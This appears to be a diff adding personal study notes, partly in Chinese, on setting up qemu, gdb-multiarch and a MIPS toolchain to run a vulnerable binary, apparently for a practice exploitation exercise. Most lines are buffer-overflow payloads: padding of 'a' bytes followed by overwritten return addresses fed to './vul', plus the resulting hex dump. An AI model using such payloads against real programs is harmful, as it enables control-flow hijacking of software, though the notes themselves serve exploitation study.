@@ -1,0 +1,19 @@
+qemu
+qemu-user-static
+qemu-system
+gdb
+mips编译器
+gdb-multiarch
+wine
+
+
+qemu-mipsel ./vul `python -c "print 'a'*28+'\x14\x08\x40\x00'"` 
+
+动态编译qemu运行加L
+-L /usr/mips-linux-gnu/
+
+`python -c "print 'a'*48+'\x00\x00\x00\x00\x00\x51\07\x40'"`
+
+$(python -c "print 'a'*48+'\x00\x00\x00\x00\x00\x51\07\x40'")
+0x616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161510740000000000000
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
